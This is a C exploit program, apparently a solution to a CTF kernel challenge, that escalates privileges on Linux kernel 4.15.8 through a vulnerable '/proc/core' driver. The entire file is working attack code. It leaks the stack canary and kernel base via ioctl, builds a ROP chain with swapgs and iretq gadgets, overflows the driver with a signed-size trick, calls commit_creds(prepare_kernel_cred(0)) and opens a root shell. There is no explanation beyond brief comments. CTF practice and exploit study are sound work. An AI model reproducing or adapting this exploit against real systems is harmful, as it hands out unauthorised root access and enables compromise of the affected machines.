//kernel 4.15.8
//ret2usr.c
//gcc ret2usr.c -o ret2usr -w -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int fd;
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr,prepare_kernel_cred_addr;
 
void core_read(char *buf){
    ioctl(fd,0x6677889B,buf);
    //printf("[*]The buf is:%x\n",buf);
}

void change_off(long long v1){
    ioctl(fd,0x6677889c,v1);
}

void core_write(char *buf,int a3){
    write(fd,buf,a3);
}

void core_copy_func(long long size){
    ioctl(fd,0x6677889a,size);
}

void shell(){
    system("/bin/sh");
}

void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

int main(){
    int ret,i;
    char buf[0x100];
    size_t vmlinux_base,core_base,canary;
    size_t commit_creds_offset = 0x9c8e0;
    size_t prepare_kernel_cred_offset = 0x9cce0;
    size_t rop[0x100];
    save_stats();
    fd = open("/proc/core",O_RDWR);
    change_off(0x40);
    core_read(buf);
    /*
    for(i=0;i<0x40;i++){
    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
    }
    */
    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;
    core_base = *(size_t *)(&buf[0x10]) - 0x19b;
    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;
    commit_creds_addr = vmlinux_base + commit_creds_offset;
    canary = *(size_t *)(&buf[0]);
    printf("[*]canary:%p\n",canary);
    printf("[*]vmlinux_base:%p\n",vmlinux_base);
    printf("[*]core_base:%p\n",core_base);
    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);
    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);
    //junk
    for(i = 0;i < 8;i++){
        rop[i] = 0x66666666;
    }
    rop[i++] = canary;                      //canary
    rop[i++] = 0x0;
    rop[i++] = (size_t)get_root;
    rop[i++] = core_base + 0xd6;            //swapgs_ret
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    core_write(rop,0x100);
    core_copy_func(0xf000000000000100);
    return 0;
}
